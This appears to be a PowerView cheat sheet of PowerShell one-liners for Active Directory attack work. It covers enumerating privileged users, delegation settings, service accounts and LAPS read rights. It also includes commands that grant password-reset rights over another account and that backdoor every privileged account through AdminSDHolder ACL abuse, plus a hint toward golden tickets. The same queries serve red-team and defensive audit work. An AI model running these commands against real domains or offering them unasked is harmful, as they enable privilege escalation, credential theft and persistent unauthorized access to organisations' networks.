# NOTE: the most updated version of PowerView (http://www.harmj0y.net/blog/powershell/make-powerview-great-again/)
#   has an updated tricks Gist at https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

# get all the groups a user is effectively a member of, 'recursing up'
Get-NetGroup -UserName <USER>

# get all the effective members of a group, 'recursing down'
Get-NetGroupMember -GoupName <GROUP> -Recurse

# get the effective set of users who can administer a server
Get-NetLocalGroup -Recurse SERVER.domain.local

# retrieve all the computers a GPP password applies to
Get-NetOU -GUID <GPP_GUID> | %{ Get-NetComputer -ADSPath $_ }

# get all users with passwords changed > 1 year ago
$Date = (Get-Date).AddYears(-1).ToFileTime()
Get-NetUser -Filter "(pwdlastset<=$Date)"
# all enabled users
Get-NetUser -Filter "(!userAccountControl:1.2.840.113556.1.4.803:=2)"
# all disabled users
Get-NetUser -Filter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
# all users that require smart card authentication
Get-NetUser -Filter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
# all users that don't require smart card authentication
Get-NetUser -Filter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)"

# enumerate all servers that allow unconstrained delegation, and all users that aren't marked as sensitive/not for delegation
$Computers = Get-NetComputer -Unconstrained
$Users = Get-NetUser -AllowDelegation -AdminCount

# enumerate servers that allow unconstrained kerberos delegation and show all users logged in
Invoke-UserHunter -Unconstrained -ShowAll

# hunt for admin users that allow delegation, logged into servers that allow unconstrained delegation
Invoke-UserHunter -Unconstrained -AdminCount -AllowDelegation

# Get the logged on users for all machines in any *server* OU in a particular domain
Get-NetOU *server* -Domain <domain> | %{Get-NetComputer -ADSPath $_ | %{Get-NetLoggedOn -ComputerName $_}}

# find all users with an SPN set (likely service accounts)
Get-NetUser -SPN

# find all service accounts in "Domain Admins"
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}

# hunt for all privileged users (adminCount=1)
Invoke-UserHunter -AdminCount

# find users with sidHistory set
Get-NetUser -Filter '(sidHistory=*)'

# enumerate all gobal catalogs in the forest
Get-NetForestCatalog

# turn a list of computer short names to FQDNs
gc computers.txt | % {Get-NetComputer -ADSpath "GC://GLOBAL.CATALOG" -Filter "(name=$_)"}

# find interesting .vbs/.bat/.ps1 scripts on domain controllers
Invoke-FileFinder -SearchSYSVol

# enumerate the current domain policy, optionally specifying a domain to query for or a DC to reflect queries through
$DomainPolicy = Get-DomainPolicy [-Domain <DOMAIN>] [-DomainController <DC>]
$DomainPolicy.KerberosPolicy # useful for golden tickets ;)
$DomainPolicy.SystemAccess

# enumerate the current domain controller policy, resolving SIDs to account names, and seeing who has what rights on DCs by default
$DcPolicy = Get-DomainPolicy -Source DC -ResolveSids
$DcPolicy.PrivilegeRights

# enumerate what machines that a particular group has local admin rights to
Find-GPOLocation -GroupName <GROUP>

# enumerate what machines that a given user in the specified domain has RDP access rights to, reflecting queries through a particular DC
Find-GPOLocation -UserName <USER> -Domain <DOMAIN> -DomainController <DC> -LocalGroup RDP

# export a csv of all GPO mappings
Find-GPOLocation | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv

# use alternate credentials for searching for files on the domain
$Password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential("DOMAIN\user",$Password)
Invoke-FileFinder -Domain DOMAIN -Credential $Credential

# enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names
Get-ObjectAcl -SamAccountName matt -Domain testlab.local -ResolveGUIDs

# grant user 'will' the rights to change 'matt's password
Add-ObjectAcl -TargetSamAccountName matt -PrincipalSamAccountName will -Rights ResetPassword

# audit the permissions of AdminSDHolder, resolving GUIDs
Get-ObjectACL -ADSPrefix 'CN=AdminSDHolder,CN=System' -ResolveGUIDs

# backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName matt -Rights All

# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectACL -DistinguishedName "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}

# find linked DA accounts using name correlation
Get-NetGroupMember -GroupName "Domain Admins" | %{ Get-NetUser $_.membername } | %{ $a=$_.displayname.split(" ")[0..1] -join " "; Get-NetUser -Filter "(displayname=*$a*)" } | Select-Object -Property displayname,samaccountname

# save a PowerView object to disk for later usage
Get-NetUser | Export-Clixml user.out
$Users = Import-Clixml user.out

# Find any machine accounts in privileged groups
Get-NetGroup -AdminCount | Get-NetGroupMember -Recurse | ?{$_.MemberName -like '*$'}

# Enumerate permissions for GPOs where users have some kind of modify rights
Get-NetGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectType -eq 'All') -and ($_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty|CreateChild" )}

# find all policies applied to a current machine
Get-NetGPO -ComputerName WINDOWS1.testlab.local

# find the user/groups that have read access to the LAPS password property for a specified computer
Get-NetComputer -ComputerName 'LAPSCLIENT.test.local' -FullData |
    Select-Object -ExpandProperty distinguishedname |
    ForEach-Object { $_.substring($_.indexof('OU')) } | ForEach-Object {
        Get-ObjectAcl -ResolveGUIDs -DistinguishedName $_
    } | Where-Object {
        ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and
        ($_.ActiveDirectoryRights -match 'ReadProperty')
    } | ForEach-Object {
        Convert-NameToSid $_.IdentityReference
    } | Select-Object -ExpandProperty SID | Get-ADObject

# get the ACLs for all OUs where someone is allowed to read the LAPS password attribute
Get-NetOU -FullData | 
    Get-ObjectAcl -ResolveGUIDs | 
    Where-Object {
        ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and 
        ($_.ActiveDirectoryRights -match 'ReadProperty')
    } | ForEach-Object {
        $_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSid $_.IdentityReference).SID;
        $_
    }

# perform a user 'zone transfer' by exporting all AD DNS records from all zones, exporting to a .csv
Get-DNSZone | Get-DNSRecord | Export-CSV -NoTypeInformation dns.csv

# return all universal security groups in a forest with foreign members
Get-NetGroup -Filter '(member=*)(groupType=2147483656)' -ADSPath 'GC://testlab.local' -FullData | Select-Object samaccountname,distinguishedname,member | ForEach-Object {
    $GroupDomain = $_.distinguishedname.subString($_.distinguishedname.IndexOf("DC="))
    $_.Member = $_.Member | ForEach-Object {
        $MemberDomain = $_.subString($_.IndexOf("DC="))
        if($GroupDomain -ne $MemberDomain) {
            $_
        }
    }
    $_
} | Where-Object {$_.Member}
